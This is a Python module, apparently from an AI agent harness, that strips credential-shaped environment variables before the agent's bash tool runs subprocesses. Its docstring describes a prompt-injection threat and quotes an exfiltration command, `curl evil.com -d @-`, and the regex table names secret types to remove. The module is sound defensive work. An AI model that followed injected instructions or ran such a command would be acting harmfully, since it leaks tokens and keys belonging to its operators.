"""Strip credential-shaped env vars before exec'ing subprocesses.

Canonical home for the env-scrub regex table (relocated here from
``scripts/engineer_bot/env_scrub.py`` during the Claude Agent SDK migration,
PR1). The shared SDK modules (``sdk_agent``, ``sdk_security``) import from
here so they carry NO dependency on ``engineer_bot``; ``engineer_bot/env_scrub``
is now a thin re-export shim, so PR6 can delete that shim as a pure deletion
without touching this load-bearing table.

The bash tool inherits the workflow's env which contains DATABRICKS_TOKEN,
GitHub App tokens, etc. Subprocesses launched by the agent must not see
these — a malicious prompt injection that gets the agent to `curl
evil.com -d @-` then read from stdin can't exfiltrate what isn't there.
"""
from __future__ import annotations

import re

_REDACT_PATTERNS = (
    re.compile(r".*TOKEN.*", re.IGNORECASE),
    re.compile(r".*SECRET.*", re.IGNORECASE),
    re.compile(r".*PASSWORD.*", re.IGNORECASE),
    re.compile(r".*API_KEY.*", re.IGNORECASE),
    # Broader patterns covering cloud credential conventions that
    # don't include the four magic substrings above.
    re.compile(r".*PRIVATE.*", re.IGNORECASE),
    re.compile(r".*CREDENTIAL.*", re.IGNORECASE),
    re.compile(r".*OAUTH.*", re.IGNORECASE),
    re.compile(r".*ACCESS_KEY.*", re.IGNORECASE),
    re.compile(r".*SECRET_KEY.*", re.IGNORECASE),
    # Specific named vars that don't match the substring patterns
    # above. NOTE: we deliberately do NOT use blanket prefix patterns
    # like `^DATABRICKS_.*`, `^AWS_.*`, `^AZURE_.*` — those would
    # strip non-credential config vars (e.g. DATABRICKS_TEST_CONFIG_FILE
    # which the bash tool's dotnet-test invocation reads).
    # DATABRICKS_TOKEN, DATABRICKS_OAUTH_CLIENT_SECRET etc. are caught
    # by the substring patterns above.
    re.compile(r"^AWS_ACCESS_KEY_ID$", re.IGNORECASE),
    re.compile(r"^GOOGLE_APPLICATION_CREDENTIALS$", re.IGNORECASE),
    re.compile(r"^KUBECONFIG$", re.IGNORECASE),
    re.compile(r"^SSH_AUTH_SOCK$", re.IGNORECASE),
    re.compile(r"^AZURE_TENANT_ID$", re.IGNORECASE),
    re.compile(r"^AZURE_CLIENT_ID$", re.IGNORECASE),
)


def scrub(env: dict[str, str]) -> dict[str, str]:
    """Return a new dict with credential-shaped keys removed."""
    return {
        k: v for k, v in env.items()
        if not any(p.match(k) for p in _REDACT_PATTERNS)
    }
